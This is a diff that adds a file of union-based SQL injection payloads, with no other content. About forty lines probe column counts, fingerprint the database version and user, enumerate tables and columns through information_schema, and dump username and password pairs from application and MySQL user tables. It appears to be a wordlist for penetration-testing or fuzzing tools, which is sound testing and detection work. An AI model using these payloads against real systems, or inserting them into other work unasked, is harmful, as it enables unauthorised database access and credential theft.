@@ -1,0 +1,41 @@
+# Union-Based SQL Injection Payloads
+' UNION SELECT null--
+' UNION SELECT 1--
+' UNION SELECT 1,2--
+' UNION SELECT 1,2,3--
+' UNION SELECT 1,2,3,4--
+' UNION SELECT 1,2,3,4,5--
+' UNION SELECT @@version--
+' UNION SELECT version()--
+' UNION SELECT null,@@version--
+' UNION SELECT null,version()--
+' UNION SELECT database()--
+' UNION SELECT null,database()--
+' UNION SELECT user()--
+' UNION SELECT null,user()--
+' UNION SELECT current_user--
+' UNION SELECT null,current_user--
+' UNION SELECT table_name FROM information_schema.tables--
+' UNION SELECT null,table_name FROM information_schema.tables--
+' UNION SELECT table_schema,table_name FROM information_schema.tables--
+' UNION SELECT column_name FROM information_schema.columns--
+' UNION SELECT null,column_name FROM information_schema.columns--
+' UNION SELECT table_name,column_name FROM information_schema.columns--
+' UNION SELECT username,password FROM users--
+' UNION SELECT null,concat(username,':',password) FROM users--
+' UNION SELECT null,concat(user,':',password) FROM mysql.user--
+' UNION SELECT 1#
+' UNION SELECT 1,2#
+' UNION SELECT 1,2,3#
+' UNION SELECT null/*
+' UNION SELECT 1/*
+' UNION SELECT 1,2/*
+" UNION SELECT 1--
+" UNION SELECT 1,2--
+') UNION SELECT 1--
+') UNION SELECT 1,2--
+') UNION SELECT 1,2,3--
+' UNION ALL SELECT 1--
+' UNION ALL SELECT 1,2--
+' UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b--
+' UNION SELECT 1 FROM information_schema.tables--
